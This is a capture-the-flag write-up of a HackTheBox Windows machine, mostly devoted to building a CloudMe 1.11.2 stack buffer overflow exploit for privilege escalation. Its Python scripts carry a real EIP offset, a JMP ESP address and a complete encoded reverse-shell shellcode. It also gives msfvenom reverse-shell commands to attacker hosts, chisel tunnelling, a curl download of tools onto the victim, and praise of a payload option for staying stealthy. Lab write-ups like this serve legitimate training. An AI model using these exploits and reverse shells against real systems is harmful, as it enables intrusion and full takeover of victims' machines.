HackTheBox
## Scanning
PORT     STATE SERVICE    REASON          VERSION
7680/tcp open  pando-pub? syn-ack ttl 127
8080/tcp open  http       syn-ack ttl 127 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
|_http-title: mrb3n's Bro Hut
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6

## Enumeration
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240323211329.png)

We've got the technology
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240323211410.png)

[[Internal Path Discloser]]
Analysing the Unauthenticated Remote Code execution, we found that by lokking for *upload.php* we found a server directory

![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324054854.png)

Testing the script
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324060523.png)

If it doesn't work we can create a reverse shell for Windows by using a smbserver to upload the file and create the connection
![[Reverses Shell]]

To find the flag we use: `dir /r /s user.txt` since folder `C:\Users`

![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324073028.png)

# Privilege Escalation

Using [[WinPEAS]] we can detect some suspicious files:
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324082619.png)

### Exploiting CloudMe
We verify if this service is probably running in windows system
By searching for CloudMe in google, by default it runs in port 8888, coincidentally, port 8888 is open
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324082653.png)
The installer version found id 1.11.2, so we can use any of this exploits or we can do it mannually
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324082904.png)
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324083047.png)

## BufferOverflow
[[BufferOverFlow|BufferOverFlow]]

At first we download the version of CloudMe in our machine
In our windows7 where it's download the file, we verified that port 8888 is open:
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324121611.png)
Reviewing the exploit db script, it sends directly to the port 8888 the payload:
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324121759.png)
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324122630.png)

As there is not the port available, we can use pivoting to access to it.
[[Pivoting]]
Using chisel, same version for attacker and victime,

Parrot:
`chmod +x chisel`
 `./chisel server --reverse -p 1234`

Windows:
`chisel.exe client 192.168.195.170:1234 R:8888:127.0.0.1:8888`

Seeing the tunnel using `lsof -i:8888`
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324132727.png)
### Creating our own exploit:
In python3, by lunching 5000 A, the software crashes
`#!/usr/bin/python3`

`import socket`
`import signal`

`def def_handler(sig, frame):`
    `print("\n\n[!] Quitting...\n")`
    `sys.exit(1)`

`# Ctrl+C`
`signal.signal(signal.SIGINT, def_handler)`

`#Global attributes`
`ip_address="127.0.0.1"`
`payload = b"A"*5000`


`def makeConnection():`

    `s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)`
    `s.connect((ip_address, 8888))`
    `s.send(payload)`


`if __name__=='__main__':`
    `makeConnection()`

![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324133352.png)
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324133814.png)

All is fulls of A. EIP doesn't recognize address 41414141 so it crashes.

Now we need to find how to fill EIP with a desired address.
We can generate offsets by using:
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
```

We modify our payload with this:
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324140027.png)


After executing the script, we need to find in which string the EIP crashed to determine the offset lenght
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324142254.png)
EIP = 316A4230
As windows7 uses little ending, then the string should be reversed:

*string*: 30426A31
`echo -n "30426A31" | xxd -ps -r; echo`
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324142451.png)

Locating the string
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324142818.png)

#### Getting offset automatically based on EIP
We set EIP value as parameter:
`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x316A4230`
>[*] Exact match at offset 1052

#### Adjusting our script

We want to verify id the offset is correct, as well as the capacity of manopulate the EIP and see what will be shown after el EIP 
`#!/usr/bin/python3`

`import socket`
`import signal`

`def def_handler(sig, frame):`
    `print("\n\n[!] Quitting...\n")`
    `sys.exit(1)`

`# Ctrl+C`
`signal.signal(signal.SIGINT, def_handler)`

`#Global attributes`
`ip_address="127.0.0.1"`
`offset = 1052`
`before_eip = b"A"*offset`
`eip = b"B"*4`
`after_eip = b"C"*500`

`payload = before_eip + eip +after_eip`
`def makeConnection():`

    `s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)`
    `s.connect((ip_address, 8888))`
    `s.send(payload)`


`if __name__=='__main__':`
    `makeConnection()`

![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324144827.png)

To verify if C letters are in the beginning of ESP (Stack Pointer) we can check the stack and the previous address. This is to be sure that we are injecting characters right before EIP
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324153820.png)

As we don't change directly the EIP directly, we need to set an *offcode*  to jump to our shell

#### Identifying bad chars
After downloaded, install in *C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands*

Testing:
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324154807.png)
Creating a working folder in the desktop:
```
!mona config -set workingfolder C:\Users\fredd\Desktop\%p
```

For example by creating a bitearray file by using:

`*!mona bytearray*`

It will be stored in our folder

We can edit and only let the necessary information, after that, share this to a smbFolder to linux

```
smbserver.py smbFolder $(pwd) -smb2support
```
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324155517.png)

Copying the file to the clipboard:
`cat bytearray.txt| xclip -sel clip`

We dd this to out payload

`#!/usr/bin/python3`

`import socket`
`import signal`

`def def_handler(sig, frame):`
    `print("\n\n[!] Quitting...\n")`
    `sys.exit(1)`

`# Ctrl+C
`signal.signal(signal.SIGINT, def_handler)`

`#Global attributes`
`ip_address="127.0.0.1"`
`offset = 1052`
`before_eip = b"A"*offset`
`eip = b"B"*4`

`badchars = (b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"`
`b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"`
`b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"`
`b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"`
`b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"`
`b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"`
`b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"`
`b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")`

`payload = before_eip + eip + badchars`
`def makeConnection():`

    `s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)`
    `s.connect((ip_address, 8888))`
    `s.send(payload)`


`if __name__=='__main__':`
    `makeConnection()`

##### Now we can find the bad chars
Dumping the string

![[Pasted image 20240324160459.png]]
We need to analyze which sequence of numbers is not the correct. **In general x\00 is a bad char**. In this case it's been showed in any way but we will remove it. *\x0A* and *\x0D* grant problems too in general.

![[Pasted image 20240324160630.png]]
#### Getting opcode
By using:

`/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
![[Pasted image 20240324161433.png]]
	Its: \xFF\xE4

#### Searching for  a vulnerable service
by suing !mona modules

![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324161930.png)

We will use qsqlite.dll

Then look for the JMP ESP opcode in the vulnerable DLL
`!mona find -s "\xff\xe4" -m qsqlite.dll`

![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324162810.png)

To verify if this works, we look for the address:
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324163058.png)
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324163118.png)

We can add a **breakpoint** in Inmunity with *F2*

Testing in our code:

`#!/usr/bin/python3*`

`*import socket*`
`*import signal*`

`*def def_handler(sig, frame):*`
    `*print("\n\n[!] Quitting...\n")*`
    `*sys.exit(1)*`

`# *Ctrl+C*`
`*signal.signal(signal.SIGINT, def_handler)*`

`*#Global attributes*`
`*ip_address="127.0.0.1"*`
`*offset = 1052*`
`*before_eip = b"A"offset*`
`*eip = b"\x17\x91\x61\x6d" #0x6d 61 91 17*`

`*badchars = (b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"*`
`*b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"*`
`*b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"*`
`*b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"*`
`*b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"*`
`*b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"*`
`*b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"*`
`*b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")*`

`*payload = before_eip + eip + badchars*`
`*def makeConnection():*`

    `**s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)**`
    `**s.connect((ip_address, 8888))**`
    `**s.send(payload)**`


`*if _name_=='_main_':*`
    `*makeConnection()`*

To verify if this is workig, we will run the program and the program will stop in our breakpoint, after that we can try to go to the nest instruction and EIP must be the same as ESP

![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324182039.png)

We verify that the ESP is the same as EIP and we are entering to the DLL program.

![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240324182141.png)

#### Creating our shellcode
To try at first in our local machine (par default it will encode it as shikitata_ga_nai):

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.241.170 LPORT=4443 --platform windows -a x86 -b "\x00" -e x86/shikata_ga_nai -f c`

#### Using NOPs:
Necessary to give a "time" to the program to decode our shellcode

`#!/usr/bin/python3`

`import socket`
`import signal`

`def def_handler(sig, frame):`
    `print("\n\n[!] Quitting...\n")`
    `sys.exit(1)`

`# Ctrl+C`
`signal.signal(signal.SIGINT, def_handler)`

`#Global attributes`
`ip_address="127.0.0.1"`
`offset = 1052`
`before_eip = b"A"*offset`
`eip = b"\x17\x91\x61\x6d" #0x6d 61 91 17`
`nops = b"\x90"*16`

`shellcode = (b"\xbd\xf7\x3b\xbe\x13\xda\xd9\xd9\x74\x24\xf4\x58\x29\xc9"`
`b"\xb1\x52\x31\x68\x12\x03\x68\x12\x83\x37\x3f\x5c\xe6\x4b"`
`b"\xa8\x22\x09\xb3\x29\x43\x83\x56\x18\x43\xf7\x13\x0b\x73"`
`b"\x73\x71\xa0\xf8\xd1\x61\x33\x8c\xfd\x86\xf4\x3b\xd8\xa9"`
`b"\x05\x17\x18\xa8\x85\x6a\x4d\x0a\xb7\xa4\x80\x4b\xf0\xd9"`
`b"\x69\x19\xa9\x96\xdc\x8d\xde\xe3\xdc\x26\xac\xe2\x64\xdb"`
`b"\x65\x04\x44\x4a\xfd\x5f\x46\x6d\xd2\xeb\xcf\x75\x37\xd1"`
`b"\x86\x0e\x83\xad\x18\xc6\xdd\x4e\xb6\x27\xd2\xbc\xc6\x60"`
`b"\xd5\x5e\xbd\x98\x25\xe2\xc6\x5f\x57\x38\x42\x7b\xff\xcb"`
`b"\xf4\xa7\x01\x1f\x62\x2c\x0d\xd4\xe0\x6a\x12\xeb\x25\x01"`
`b"\x2e\x60\xc8\xc5\xa6\x32\xef\xc1\xe3\xe1\x8e\x50\x4e\x47"`
`b"\xae\x82\x31\x38\x0a\xc9\xdc\x2d\x27\x90\x88\x82\x0a\x2a"`
`b"\x49\x8d\x1d\x59\x7b\x12\xb6\xf5\x37\xdb\x10\x02\x37\xf6"`
`b"\xe5\x9c\xc6\xf9\x15\xb5\x0c\xad\x45\xad\xa5\xce\x0d\x2d"`
`b"\x49\x1b\x81\x7d\xe5\xf4\x62\x2d\x45\xa5\x0a\x27\x4a\x9a"`
`b"\x2b\x48\x80\xb3\xc6\xb3\x43\x7c\xbe\x4a\x39\x14\xbd\xac"`
`b"\x2f\xbe\x48\x4a\x25\x50\x1d\xc5\xd2\xc9\x04\x9d\x43\x15"`
`b"\x93\xd8\x44\x9d\x10\x1d\x0a\x56\x5c\x0d\xfb\x96\x2b\x6f"`
`b"\xaa\xa9\x81\x07\x30\x3b\x4e\xd7\x3f\x20\xd9\x80\x68\x96"`
`b"\x10\x44\x85\x81\x8a\x7a\x54\x57\xf4\x3e\x83\xa4\xfb\xbf"`
`b"\x46\x90\xdf\xaf\x9e\x19\x64\x9b\x4e\x4c\x32\x75\x29\x26"`
`b"\xf4\x2f\xe3\x95\x5e\xa7\x72\xd6\x60\xb1\x7a\x33\x17\x5d"`
`b"\xca\xea\x6e\x62\xe3\x7a\x67\x1b\x19\x1b\x88\xf6\x99\x2b"`
`b"\xc3\x5a\x8b\xa3\x8a\x0f\x89\xa9\x2c\xfa\xce\xd7\xae\x0e"`
`b"\xaf\x23\xae\x7b\xaa\x68\x68\x90\xc6\xe1\x1d\x96\x75\x01"`
`b"\x34")`
`payload = before_eip + eip + nops + shellcode`
`def makeConnection():`

    `s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)`
    `s.connect((ip_address, 8888))`
    `s.send(payload)`


`if __name__=='__main__':`
    `makeConnection()`

Opening  a listener in the port stablished, we've got connection as admin

![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240325024004.png)
#### Reserving a memory space

 `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`
`nasm > sub esp, 0x10`
>00000000  83EC10            sub esp,byte +0x10

We replace NOPs for the memory reservation (x10)

`#Global attributes`
`ip_address="127.0.0.1"`
`offset = 1052`
`before_eip = b"A"*offset`
`eip = b"\x17\x91\x61\x6d" #0x6d 61 91 17`
`sub_esp = b"\x83\xEC\x10" #sub esp, 0x10`

We need as well to change the payload since we will attack now the remote machine

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.70 LPORT=4443 --platform windows -a x86 -b "\x00" -f c EXITFUNC=thread`

**Note:** When you exploit a vulnerability in an application using this payload to get a reverse shell, the vulnerable application will continue to run independently of your remote session. The payload will exit without terminating the application itself. This allows you to maintain stealth and avoid alerting the user or administrator of the system to the exploitation activity.

#### Connecting to the victime

Considering the architecture of the victime, we download chisel and upload to the victime using curl. This is necessary since port 8888 is not published.
`curl http://10.10.14.70:8080/chisel.exe -o chisel.exe` *it's important to put the output*

Victime:
`chisel.exe client 10.10.14.70:1234 R:8888:127.0.0.1:8888`

Attacker:
`./chisel server --reverse -p 1234`













